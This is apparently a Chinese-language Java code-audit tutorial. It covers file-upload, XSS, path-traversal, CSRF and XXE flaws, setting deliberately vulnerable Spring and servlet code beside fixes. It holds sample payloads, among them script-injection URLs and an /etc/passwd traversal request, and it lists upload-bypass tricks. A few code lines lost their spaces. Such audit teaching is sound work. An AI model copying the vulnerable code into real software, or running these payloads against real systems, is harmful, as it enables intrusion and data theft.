- 首先关注文件后缀验证，使用白名单或黑名单，建议使用白名单。使用`lastIndexOf()`方法获取文件后缀，使用`IndexOf()`可能被绕过。如果是白名单验证时，使用`toLowerCase()`处理再进行对比，或使用`equalsIgnoreCase()`，避免被大小写绕过。

- 是否校验了文件的大小。

- 是否校验了文件类型`getContentType()`，这种方式虽然能够被绕过，但还是会增加攻击成本。

- 对于使用Hutool的FileTypeUtil的`getType()`或`ImageIO.read()`通过读取文件流中前N个byte值来判断文件类型的，也可以使用类似图片马的方式进行绕过。

- "%00"截断能否绕过。

- QP编码特性能否绕过。`javax.mail.internet.MimeUtility.encodeWord()`方法。

- 有一些安全校验的顺序有问题，先将文件保存，再进行安全检测，如果不通过检测则进行删除，此时可以在文件保存后触发报错终止流程，导致不删除文件。

  重点是文件上传相关类或函数：

```java
FileUpload
FileUploadBase
FileItemIteratorImpl
FileItemStreamImpl
FileUtils
UploadHandleServlet
FileLoadServlet
FileOutputStream
DiskFileItemFactory
MultipartRequestEntity
MultipartFile
com.oreilly.servlet.MultipartRequest
```

### （一）、常规漏洞

```java
// 文件上传的控制器方法，用于展示上传页面
@GetMapping("/any")
public String index() {
    return "upload"; // 返回 upload.html 页面
}

// 处理单个文件上传的控制器方法
@PostMapping("/upload")
public String singleFileUpload(@RequestParam("file") MultipartFile file,
                               RedirectAttributes redirectAttributes) {
    if (file.isEmpty()) {
        // 如果文件为空，将消息赋值给 uploadStatus.html 页面的动态参数 message
        redirectAttributes.addFlashAttribute("message", "Please select a file to upload");
        return "redirect:/file/status";
    }

    try {
        // 获取文件内容并保存到指定路径
        byte[] bytes = file.getBytes();
        Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
        Files.write(path, bytes);

        // 上传成功后的消息
        redirectAttributes.addFlashAttribute("message",
                "You successfully uploaded '" + UPLOADED_FOLDER + file.getOriginalFilename() + "'");

    } catch (IOException e) {
        // 上传失败后的消息
        redirectAttributes.addFlashAttribute("message", "upload failed");
        logger.error(e.toString());
    }

    return "redirect:/file/status";
}

```

修复

1、后缀名过滤

```java
// 判断文件后缀名是否在白名单内
String[] picSuffixList = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};
boolean suffixFlag = false;
for (String white_suffix : picSuffixList) {
	if (Suffix.toLowerCase().equals(white_suffix)) {
    //利用toLowerCase()将它们都转换为小写字母进行比较（确保不受大小写影响）
		suffixFlag = true;
		break;
	}
}
```

2、MIME过滤

对MIME类型进行了黑名单限制，不过这个可以进行抓包修改绕过

```java
// 判断MIME类型是否在黑名单内
String[] mimeTypeBlackList = {
		"text/html",
		"text/javascript",
		"application/javascript",
		"application/ecmascript",
		"text/xml",
		"application/xml"
};
for (String blackMimeType : mimeTypeBlackList) {
	// 用contains是为了防止text/html;charset=UTF-8绕过
	if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {
		logger.error("[-] Mime type error: " + mimeType);
		//deleteFile(filePath);
		return "Upload failed. Illeagl picture.";
	}
}

```

3、路径穿越过滤

文件保存的时候路径是通过 来获取，Path path =excelFile.toPath();就避免了路径穿越的实现

```java
File excelFile = convert(multifile);//文件名字做了uuid处理
String filePath = excelFile.getPath();
// 判断文件内容是否是图片 校验3
boolean isImageFlag = isImage(excelFile);
if (!isImageFlag) {
	logger.error("[-] File is not Image");
	deleteFile(filePath);
	return "Upload failed. Illeagl picture.";
}

```

4、对上传的文件过滤

```java
private static boolean isImage(File file) throws
IOException {
BufferedImage bi = ImageIO.read(file);
return bi != null;
}

```



**其他漏洞修复**

页面有th:action="upload ，进入漏洞的 upload

从@PostMapping("/upload")分析可以得出，此处没有任何的过滤

因此@GetMapping("/any 没有过滤

```html
<!DOCTYPE html>
<html xmlns:th="<http://www.thymeleaf.org>">
<body>

<h3>file upload only picture</h3>

<form method="POST" th:action="@{upload/picture}" enctype="multipart/form-data">
    <input type="file" name="file" /><br/><br/>
    <input type="submit" value="Submit" />
</form>

</body>
</html>
```

- `th:action="@{upload/picture}"`：这是Thymeleaf模板引擎中的语法，用于指定表单提交后将数据发送到的URL。具体地，它指向"/upload/picture" URL路径。
- `enctype="multipart/form-data"`：这是HTML表单的enctype属性，用于指定表单数据的编码类型。在这种情况下，它被设置为"multipart/form-data"，这是处理文件上传的标准编码类型。

它经过action提交到了/upload/picture，查看/upload/picture注解

```java
@PostMapping("/upload/picture")
    @ResponseBody
    public String uploadPicture(@RequestParam("file") MultipartFile multifile) throws Exception {
        //MultipartFile是spring类型，
        if (multifile.isEmpty()) {
            return "Please select a file to upload";
        }

        String fileName = multifile.getOriginalFilename();//得到上传的文件名，
        String Suffix = fileName.substring(fileName.lastIndexOf(".")); // 获取文件后缀名
        String mimeType = multifile.getContentType(); // 获取MIME类型
        //String filePath = falpath(multifile); //D:/tmp/pic/xxxx



        // 判断文件后缀名是否在白名单内  校验1
        String[] picSuffixList = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};
        boolean suffixFlag = false;
        for (String white_suffix : picSuffixList) {
            if (Suffix.toLowerCase().equals(white_suffix)) {
                suffixFlag = true;
                break;
            }
        }
        if (!suffixFlag) {
            logger.error("[-] Suffix error: " + Suffix);
            //deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }


        // 判断MIME类型是否在黑名单内 校验2
        String[] mimeTypeBlackList = {
                "text/html",
                "text/javascript",
                "application/javascript",
                "application/ecmascript",
                "text/xml",
                "application/xml"
        };
        for (String blackMimeType : mimeTypeBlackList) {
            // 用contains是为了防止text/html;charset=UTF-8绕过
            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {
                logger.error("[-] Mime type error: " + mimeType);
                //deleteFile(filePath);
                return "Upload failed. Illeagl picture.";
            }
        }

        File excelFile = convert(multifile);//文件名字做了uuid处理
        String filePath = excelFile.getPath();//路径穿越过滤
        // 判断文件内容是否是图片 校验3
        boolean isImageFlag = isImage(excelFile);
        if (!isImageFlag) {
            logger.error("[-] File is not Image");
            deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }


        logger.info("[+] Safe file. Suffix: {}, MIME: {}", Suffix, mimeType);
        logger.info("[+] Successfully uploaded {}", filePath);
        return String.format("You successfully uploaded '%s'", filePath);
    }
```

- 校验1 - 检查文件后缀名：在这个部分，代码将文件的后缀名与一个白名单比较，白名单中包含了一些常见的图片文件后缀名，如".jpg"、".png"等。如果上传的文件后缀名不在白名单中，将记录错误并返回"Upload failed. Illegal picture."消息。
- 校验2 - 检查MIME类型：代码继续检查上传文件的MIME类型是否在一个黑名单中。如果上传的文件MIME类型与黑名单中的任何类型匹配，将记录错误并返回"Upload failed. Illegal picture."消息。
- `File excelFile = convert(multifile)`：这行代码将`MultipartFile`对象转换为文件类型`File`，并且生成一个随机的文件名，这有助于确保文件名的唯一性。
- 校验3 - 检查文件内容：代码使用`isImage(excelFile)`函数来检查上传的文件内容是否是有效的图片。如果文件不是图片，将记录错误并返回"Upload failed. Illegal picture."消息。
- 如果文件通过了所有校验，它将被保存在服务器上，并且控制器返回一个成功上传的消息，包括文件的路径。

其中replaceSpecialStr

```java
public static String replaceSpecialStr(String str) {
        StringBuilder sb = new StringBuilder();
        str = str.toLowerCase();
        for(int i = 0; i < str.length(); i++) {
            char ch = str.charAt(i);
            // 如果是0-9
            if (ch >= 48 && ch <= 57 ){
                sb.append(ch);
            }
            // 如果是a-z
            else if(ch >= 97 && ch <= 122) {
                sb.append(ch);
            }
            else if(ch == '/' || ch == '.' || ch == '-'){
                sb.append(ch);
            }
        }

        return sb.toString();
    }
```

这是一个用于替换字符串中非法字符的实用方法，确保字符串只包含数字（0-9）、小写字母（a-z）以及特定的字符（'/'、'.'、'-'）。

## 四、xss



### （一）、反射型xss

审计XSS漏洞的关键在于定位用户输入输出的过程，以查找潜在的漏洞点。以下是审计策略的要点：

1. **用户输入输出梳理**：追踪应用程序中的用户输入和输出，特别是用户提交的数据和前端展示的数据。
2. **利用链分析**：找到一条完整的利用链，即攻击者如何在输入和输出之间注入恶意内容。这包括查找哪些参数和变量接受用户输入。
3. **现有安全措施**：结合现有的安全措施，例如输出编码、过滤器等，以确定是否存在绕过的可能性或者是否缺少必要的安全防护。
4. **关键字搜索**：寻找与XSS漏洞相关的关键字

```
<%=
${
<c:out
<c:if
<c:forEach
ModelAndView
ModelMap
Model
request.getParameter
request.setAttribute
```

**修复**：全局过滤或者使用组件antisamy

**漏洞1**

```java
package Servlet;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/XSSVulnerableServlet")
public class XSSVulnerableServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html");
        //创建一个PrintWriter对象，用于将响应写入到客户端的浏览器。
        PrintWriter out = response.getWriter();

        out.println("<html>");
        out.println("<body>");
        out.println("<form method='GET'>");
        out.println("Enter your name: <input type='text' name='input'>");
        out.println("<input type='submit' value='Submit'>");
        out.println("</form>");

        String userInput = request.getParameter("input"); // 从文本框获取用户输入
        if (userInput != null && !userInput.isEmpty()) {
            out.println("<h1>Hello, " + userInput + "!</h1>"); // 不安全的输出
        }

        out.println("</body>");
        out.println("</html>");
    }
}
```

触发xss

```java
http://localhost:8080/XSSVulnerableServlet?input=<script>alert(123)</script>
```

修复这个XSS（跨站脚本攻击）漏洞，可以使用`StringEscapeUtils`对用户输入进行合适的转义

修复漏洞的示例：

```java
package Servlet;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.text.StringEscapeUtils;

@WebServlet("/XSSFixedServlet")
public class XSSFixedServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html");
        // 创建一个PrintWriter对象，用于将响应写入到客户端的浏览器。
        PrintWriter out = response.getWriter();

        out.println("<html>");
        out.println("<body>");
        out.println("<form method='GET'>");
        out.println("Enter your name: <input type='text' name='input'>");
        out.println("<input type='submit' value='Submit'>");
        out.println("</form>");

        String userInput = request.getParameter("input"); // 从文本框获取用户输入
        if (userInput != null && !userInput.isEmpty()) {
            // 安全的输出，使用StringEscapeUtils进行HTML转义
            out.println("<h1>Hello, " + StringEscapeUtils.escapeHtml4(userInput) + "!</h1>");
        }

        out.println("</body>");
        out.println("</html>");
    }
}
```

使用了Apache Commons Text库中的`StringEscapeUtils.escapeHtml4`方法，将用户输入进行HTML转义。这样可以确保用户输入不会被解释为HTML标签或JavaScript代码，从而防止XSS攻击。

**漏洞2**

```java
@RequestMapping("/reflect")
    @ResponseBody
    public static String reflect(String xss) {
        return xss;
    }
```

触发xss

```
http://localhost:8080/xss/reflect?xss=%3Cscript%3Ealert(1)%3C/script%3E
```

修复

```java
@RequestMapping("/safe")
    @ResponseBody
    public static String safe(String xss) {
        return encode(xss);
    }

    private static String encode(String origin) {
     /*   origin = StringUtils.replace(origin, "&", "&amp;");
        origin = StringUtils.replace(origin, "<", "&lt;");
        origin = StringUtils.replace(origin, ">", "&gt;");
        origin = StringUtils.replace(origin, "\"", "&quot;");
        origin = StringUtils.replace(origin, "'", "&#x27;");
        origin = StringUtils.replace(origin, "/", "&#x2F;");*/
        origin = StringUtils.replace(origin, "&", "＆");
        origin = StringUtils.replace(origin, "<", "＜");
        origin = StringUtils.replace(origin, ">", "＞");
        origin = StringUtils.replace(origin, "\"", "＼");
        origin = StringUtils.replace(origin, "'", "＇");
        origin = StringUtils.replace(origin, "/", "／");
        return origin;
    }
```

这段代码用于处理用户输入（`xss` 参数），并通过将特殊字符进行编码来减少XSS攻击的风险。特别地，它将一些特殊字符如`&`、`<`、`>`、`"`、`'`、`/` 替换为对应的HTML实体编码。

这种做法是一种常见的XSS防御措施，通过将特殊字符编码为HTML实体，可以避免攻击者注入恶意脚本。请注意，代码中使用的是自定义编码方法，但更常见的是使用Java内置的HTML编码方法，如`org.apache.commons.text.StringEscapeUtils.escapeHtml4()`，这些方法可以更可靠地处理编码需求。

### （二）、存储型xss

漏洞代码

```java
@RequestMapping("/stored/store")
@ResponseBody
public String store(@RequestParam("xss") String xss, HttpServletResponse response) {
    Cookie cookie = new Cookie("xss", xss);
    response.addCookie(cookie);
    return "Set param into cookie";
}

@RequestMapping("/stored/show")
@ResponseBody
public String show(@CookieValue("xss") String xss) {
    return xss;
}

```

将输入的内容，存放在cookie里。show方法将获得的cookie返回到页面。payload

```
xss=<script>alert(1)</script>
```

漏洞触发

```
http://localhost:8080/xss/stored/store?xss=<script>alert(1)</script>
```

再访问

```
http://localhost:8080/xss/stored/show
```

漏洞修复

```java
@RequestMapping("/safe")
@ResponseBody
publicstaticStringsafe(Stringxss) {
returnencode(xss);
}

privatestaticStringencode(Stringorigin) {
/*   origin = StringUtils.replace(origin, "&", "&amp;");
origin = StringUtils.replace(origin, "<", "&lt;");
origin = StringUtils.replace(origin, ">", "&gt;");
origin = StringUtils.replace(origin, "\"", "&quot;");
origin = StringUtils.replace(origin, "'", "&#x27;");
origin = StringUtils.replace(origin, "/", "&#x2F;");*/
origin=StringUtils.replace(origin, "&", "＆");
origin=StringUtils.replace(origin, "<", "＜");
origin=StringUtils.replace(origin, ">", "＞");
origin=StringUtils.replace(origin, "\"", "＼");
origin=StringUtils.replace(origin, "'", "＇");
origin=StringUtils.replace(origin, "/", "／");
returnorigin;
}
```

## 五、目录遍历
关键字符

```
sun.nio.ch.FileChannelImpl
java.io.File.list/listFiles
java.io.FileInputStream
java.io.FileOutputStream
java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem
sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider
java.io.RandomAccessFile
sun.nio.fs.CopyFile
sun.nio.fs.UnixChannelFactory
sun.nio.fs.WindowsChannelFactory
java.nio.channels.AsynchronousFileChannel
FileUtil/IOUtil
filePath/download/deleteFile/move/getFile
```
### （一）、常规漏洞

**漏洞**

```java
@GetMapping("/path_traversal/vul")
    public String getImage(String filepath) throws IOException {
        return getImgBase64(filepath);
    }


private String getImgBase64(String imgFile) throws IOException {

        logger.info("Working directory: " + System.getProperty("user.dir"));
        logger.info("File path: " + imgFile);

        File f = new File(imgFile);
        if (f.exists() && !f.isDirectory()) {
          //检查文件是否存在且不是一个目录。如果文件存在且不是目录，进入条件块。
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        } else {
            return "File doesn't exist or is not a file.";
        }
    }
```

漏洞触发

```
http://localhost:8080/path_traversal/vul?filepath=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

漏洞修复

```java
@GetMapping("/path_traversal/sec")
    public String getImageSec(String filepath) throws IOException {
        if (SecurityUtil.pathFilter(filepath) == null) {
            logger.info("Illegal file path: " + filepath);
            return "Bad boy. Illegal file path.";
        }
        return getImgBase64(filepath);
    }



private String getImgBase64(String imgFile) throws IOException {

        logger.info("Working directory: " + System.getProperty("user.dir"));
        logger.info("File path: " + imgFile);

        File f = new File(imgFile);
        if (f.exists() && !f.isDirectory()) {
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        } else {
            return "File doesn't exist or is not a file.";
        }
    }
```

```java
public static String pathFilter(String filepath) {
        String temp = filepath;

        while (temp.indexOf('%') != -1) {
          //检查字符串中是否包含百分号（`%`），如果包含则执行以下操作
            try {
                temp = URLDecoder.decode(temp, "utf-8");//解码
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
          //处理URL编码后，它检查`temp`字符串是否包含双点（`..`）或是否以斜杠（`/`）开头。如果是，表示路径不安全，将返回`null`。
            return null;
        }

        return filepath;
    }
```

## 六、CSRF

### （一）、常规漏洞

**漏洞**

```java
@Controller
@RequestMapping("/csrf")
public class CSRF {

    @GetMapping("/")
    public String index() {
        return "form"; //追踪form
    }

    @PostMapping("/post")
    @ResponseBody
    public String post() {
        return "CSRF passed.";
    }
}
```

//追踪form

```
<form name="f" action="/csrf/post" method="post">
        <input type="text" name="input" />
        <input type="submit" value="Submit" />
</form>
```

**漏洞修复方法1--token校验**

（1）前端代码，在对应的功能点提交所用的form中新增了hidden字段，该字段name和value均源于用户登录成功后，后端随机分配的值，从而规定了页面的合法性

```html
//<input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />
用于防护csrf
```

```html
<form name="f" action="/csrf/post" method="post">
        <input type="text" name="input" />
        <input type="submit" value="Submit" />
        <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />
</form>
```

`<input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />`：这是一个隐藏字段，用于在表单中包含CSRF令牌。`th:name`和`th:value`属性使用了Thymeleaf模板引擎的语法，用于在模板中动态生成CSRF令牌参数的名称和值。CSRF令牌用于验证表单提交的请求是否来自合法的源，以防止CSRF攻击。

（2）后端在收到请求之后，通过全局过滤，对请求来源的csrf的token真实性进行校验【请求来源的合法性校验】

校验：

详细参考：https://www.codenong.com/cs106144789/

CsrfFilter 是依赖 tokenRepository (private final CsrfTokenRepository tokenRepository;) 来操作 csrf-token 的. 整个逻辑很简单, 从 tokenRepository 中获取服务端的 csrf-token, 和请求中的做比较. 接下来看代码实现.

```java
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
    // 将 HttpServletResponse 对象存储到请求属性中
    request.setAttribute(HttpServletResponse.class.getName(), response);

    // 从 TokenRepository 加载 CsrfToken
    CsrfToken csrfToken = this.tokenRepository.loadToken(request);
    boolean missingToken = csrfToken == null;

    // 如果缺少 CsrfToken，则生成一个并保存
    if (missingToken) {
        csrfToken = this.tokenRepository.generateToken(request);
        this.tokenRepository.saveToken(csrfToken, request, response);
    }

    // 将 CsrfToken 存储到请求属性中
    request.setAttribute(CsrfToken.class.getName(), csrfToken);
    request.setAttribute(csrfToken.getParameterName(), csrfToken);

    // 如果请求不需要 CSRF 保护，则直接放行
    if (!this.requireCsrfProtectionMatcher.matches(request)) {
        filterChain.doFilter(request, response);
    } else {
        // 从请求中获取实际的 CsrfToken 值
        String actualToken = request.getHeader(csrfToken.getHeaderName());
        if (actualToken == null) {
            actualToken = request.getParameter(csrfToken.getParameterName());
        }

        // 比较实际的 CsrfToken 值与期望的 CsrfToken 值
        if (!csrfToken.getToken().equals(actualToken)) {
            // 如果不匹配，则处理 CSRF 错误
            if (this.logger.isDebugEnabled()) {
                this.logger.debug("Invalid CSRF token found for " + UrlUtils.buildFullRequestUrl(request));
            }

            if (missingToken) {
                // 处理缺少 CsrfToken 的情况
                this.accessDeniedHandler.handle(request, response, new MissingCsrfTokenException(actualToken));
            } else {
                // 处理 CsrfToken 不匹配的情况
                this.accessDeniedHandler.handle(request, response, new InvalidCsrfTokenException(csrfToken, actualToken));
            }
        } else {
            // CsrfToken 匹配，继续执行过滤器链
            filterChain.doFilter(request, response);
        }
    }
}

```

生成token机制：

为此, 我们需要实现自己的 CsrfTokenRepository.
总的流程:

1. 对于放行的请求: 生成与用户绑定的缓存, 缓存 csrf-token;
2. 对于其他的请求: 需要携带第1步生成的 csrf-token, CsrfFilter 届时会用**缓存中的和请求中的对比, 以判断是否是合法请求**;

**每次合法的身份验证之后, 都应当更换缓存中的 csrf-token,** 并在相应头中置入新的 csrf-token. 这一过程受控于 CsrfAuthenticationStrategy 这个类, 它负责在执行认证请求之后, **删除旧的令牌, 生成新的. 确保每次请求之后, csrf-token 都得到更新.**

```java
public final class CsrfAuthenticationStrategy implements SessionAuthenticationStrategy {
    private final CsrfTokenRepository csrfTokenRepository;
    public CsrfAuthenticationStrategy(CsrfTokenRepository csrfTokenRepository) {
        Assert.notNull(csrfTokenRepository, "csrfTokenRepository cannot be null");
        this.csrfTokenRepository = csrfTokenRepository;
    }

    public void onAuthentication(Authentication authentication, HttpServletRequest request, HttpServletResponse response) throws SessionAuthenticationException {
        // 检查请求中是否包含 CSRF 令牌
        boolean containsToken = this.csrfTokenRepository.loadToken(request) != null;
        
        // 如果请求中包含 CSRF 令牌
        if (containsToken) {
            // 清理旧的 CSRF 令牌
            this.csrfTokenRepository.saveToken((CsrfToken)null, request, response);
            
            // 生成新的 CSRF 令牌
            CsrfToken newToken = this.csrfTokenRepository.generateToken(request);
            
            // 保存新的 CSRF 令牌
            this.csrfTokenRepository.saveToken(newToken, request, response);
            
            // 将新的 CSRF 令牌存储到请求属性中
            request.setAttribute(CsrfToken.class.getName(), newToken);
            request.setAttribute(newToken.getParameterName(), newToken);
        }
    }
}

```

这个类`CsrfAuthenticationStrategy`是一个用于处理CSRF（跨站请求伪造）令牌认证的策略。它实现了`SessionAuthenticationStrategy`接口，可以对HTTP请求进行CSRF令牌的检查和更新。

以下是对每行代码的详细解释：

1. `public final class CsrfAuthenticationStrategy implements SessionAuthenticationStrategy`: 定义了一个名为`CsrfAuthenticationStrategy`的公开类，它实现了`SessionAuthenticationStrategy`接口。`final`关键字表示这个类不能被继承。
2. `private final CsrfTokenRepository csrfTokenRepository;`: 这是一个私有成员变量，用来保存`CsrfTokenRepository`实例。它的值在类被实例化的时候通过构造函数设置，并且之后不能被改变。
3. `public CsrfAuthenticationStrategy(CsrfTokenRepository csrfTokenRepository)`: 这是类的构造函数，它接收一个`CsrfTokenRepository`类型的参数，并用来初始化`csrfTokenRepository`成员变量。使用`Assert.notNull`来确保传入的参数不为空。
4. `public void onAuthentication(Authentication  authentication, HttpServletRequest request, HttpServletResponse  response) throws SessionAuthenticationException`: 这是实现`SessionAuthenticationStrategy`接口所必须的方法。它会在每次认证成功后被调用，用来处理后续的操作，例如更新CSRF令牌。
5. `boolean containsToken = this.csrfTokenRepository.loadToken(request) != null;`: 这行代码检查请求中是否包含CSRF令牌。如果包含（即`loadToken(request)`返回的结果不为空），则`containsToken`的值为`true`。
6. `if (containsToken) { ... }`: 如果请求中包含CSRF令牌，则执行大括号内的代码。
7. `this.csrfTokenRepository.saveToken((CsrfToken)null, request, response);`: 这行代码会清理旧的CSRF令牌。将`null`保存为新的CSRF令牌。
8. `CsrfToken newToken = this.csrfTokenRepository.generateToken(request);`: 这行代码生成一个新的CSRF令牌。
9. `this.csrfTokenRepository.saveToken(newToken, request, response);`: 这行代码保存新的CSRF令牌。
10. `request.setAttribute(CsrfToken.class.getName(), newToken);`: 这行代码将新的CSRF令牌存储到请求属性中，这样它就可以在后续的请求中使用了。
11. `request.setAttribute(newToken.getParameterName(), newToken);`: 这行代码将新的CSRF令牌也存储到请求属性中，参数名是新令牌的参数名。

总的来说，这个类的主要功能是在用户认证成功后更新CSRF令牌，确保每次请求都使用最新的CSRF令牌，从而防止CSRF攻击。

**修复方式2-增加referer字段进行判断**

```java
public class CsrfAccessDeniedHandler implements AccessDeniedHandler {

    protected final Logger logger = LoggerFactory.getLogger(this.getClass());

    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       AccessDeniedException accessDeniedException) throws IOException {

        // 记录请求的URL和Referer信息
        logger.info("[-] URL: " + request.getRequestURL() + "?" + request.getQueryString() + "\t" +
                "Referer: " + request.getHeader("referer"));

        // 设置响应的Content-Type为text/html
        response.setContentType(MediaType.TEXT_HTML_VALUE);

        // 设置响应状态为403 Forbidden
        response.setStatus(HttpServletResponse.SC_FORBIDDEN);

        // 返回错误消息
        response.getWriter().write("CSRF check failed by JoyChou.");
    }
}

```

因此：最**完善的防御方案**是referer验证和token验证相结合

## 七、XXE

代码审计常用参数

```html
xmlReader
SAXBuilder
SAXReader
SAXParser
Digester
DocumentBuilder
DocumentHelper
```

**漏洞修复**

为防止XXE漏洞，需要采取以下措施：

1. **禁用外部实体**：在XML解析过程中禁用外部实体引用，以防止XXE攻击。这可以通过设置XML解析器的特性来实现，具体取决于您使用的XML解析库。例如，对于Java中的`DocumentBuilderFactory`，您可以禁用外部实体引用：

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

2. **限制实体扩展**：如果需要允许外部实体引用，应明确指定白名单允许的外部实体，而不是接受所有外部实体。您可以通过设置`EntityResolver`来实现这一点，以拒绝未经授权的实体。

3. **过滤用户输入**：确保在XML解析之前对用户提供的XML数据进行过滤和验证，以防止恶意或未预期的XML内容。

4. **升级XML解析器**：使用最新版本的XML解析库，因为它们通常包含更多的安全性修复和改进。

### （一）、xmlReader（无回显）

漏洞代码1

```java
@PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();//创建了一个XML解析器
            xmlReader.parse(new InputSource(new StringReader(body)));  // 解析 xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

漏洞代码2

```java
@PostMapping("/XMLReader/vuln")
    public String XMLReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            SAXParserFactory spf = SAXParserFactory.newInstance();//创建一个SAX解析器工厂
            SAXParser saxParser = spf.newSAXParser();//使用SAX解析器工厂创建一个SAX解析器
            XMLReader xmlReader = saxParser.getXMLReader();//这行代码从SAX解析器获取XMLReader
            xmlReader.parse(new InputSource(new StringReader(body)));// 解析 xml

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "XMLReader xxe vuln code";
    }
```

这两段代码都涉及 XML 解析，但它们使用了不同的类库和 API 进行 XML 解析，分别是 JAXP (`javax.xml.parsers`) 和 SAX (`org.xml.sax` 包)。

### （二）、SAXBuilder（无回显）

漏洞代码

```java
@RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            SAXBuilder builder = new SAXBuilder();//创建了一个SAXBuilder对象，用于构建SAX解析器

            builder.build(new InputSource(new StringReader(body)));  
          // StringReader 用于将 XML 数据从字符串转换为字符流，然后 InputSource 包装这个字符流。
          //整体来说，这行代码的作用是将一个包含 XML 数据的字符串 body 解析为一个 DOM 对象，使用的是 DOM 解析器的 build 方法。
            return "SAXBuilder xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

### （三）、SAXReader（无回显）

漏洞代码

```java
@RequestMapping(value = "/SAXReader/vuln", method = RequestMethod.POST)
public String SAXReaderVuln(HttpServletRequest request) {
    try {
        // 从请求中获取请求体
        String body = WebUtils.getRequestBody(request);
        logger.info(body);
        // 创建 SAXReader 对象
        SAXReader reader = new SAXReader();
        // 使用 SAXReader 读取 XML 数据，这一行可能导致 XXE 攻击
        reader.read(new InputSource(new StringReader(body)));

    } catch (Exception e) {
        // 记录异常信息
        logger.error(e.toString());
        return EXCEPT;
    }

    return "SAXReader xxe vuln code";
}

```

### （四）、SAXParser（无回显）

漏洞代码

```java
@RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
public String SAXParserVuln(HttpServletRequest request) {
    try {
        // 从请求中获取请求体
        String body = WebUtils.getRequestBody(request);
        logger.info(body);
        // 创建 SAXParserFactory 对象
        SAXParserFactory spf = SAXParserFactory.newInstance();
        // 创建 SAXParser 对象
        SAXParser parser = spf.newSAXParser();
        // 使用 SAXParser 解析 XML 数据，这一行可能导致 XXE 攻击
        parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());
        return "SAXParser xxe vuln code";
    } catch (Exception e) {
        // 记录异常信息
        logger.error(e.toString());
        return EXCEPT;
    }
}

```

### （五）、Digester（无回显）

```java
@RequestMapping(value = "/Digester/vuln", method = RequestMethod.POST)
public String DigesterVuln(HttpServletRequest request) {
    try {
        // 从请求中获取请求体
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        // 创建 Digester 对象
        Digester digester = new Digester();
        // 使用 Digester 解析 XML 数据，这一行可能导致 XXE 攻击
        digester.parse(new StringReader(body));

    } catch (Exception e) {
        // 记录异常信息
        logger.error(e.toString());
        return EXCEPT;
    }
    return "Digester xxe vuln code";
}

```

### （六）、DocumentHelper（无回显）

```java
@PostMapping("/DocumentHelper/vuln")
public String DocumentHelper(HttpServletRequest req) {
    try {
        // 从请求中获取请求体
        String body = WebUtils.getRequestBody(req);
        // 使用 DocumentHelper 解析 XML 数据，这一行可能导致 XXE 攻击
        DocumentHelper.parseText(body);

    } catch (Exception e) {
        // 记录异常信息
        logger.error(e.toString());
        return EXCEPT;
    }

    return "DocumentHelper xxe vuln code";
}

```

### （七）、DocumentBuilder（有回显）

```java
@RequestMapping(value = "/DocumentBuilder/vuln01", method = RequestMethod.POST)
public String DocumentBuilderVuln01(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        // 创建 DocumentBuilderFactory 对象
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // 创建 DocumentBuilder 对象
        DocumentBuilder db = dbf.newDocumentBuilder();

        // 将 XML 数据转换为输入流
        StringReader sr = new StringReader(body);
        // 创建 InputSource 对象，用于解析器解析 XML 数据
        InputSource is = new InputSource(sr);
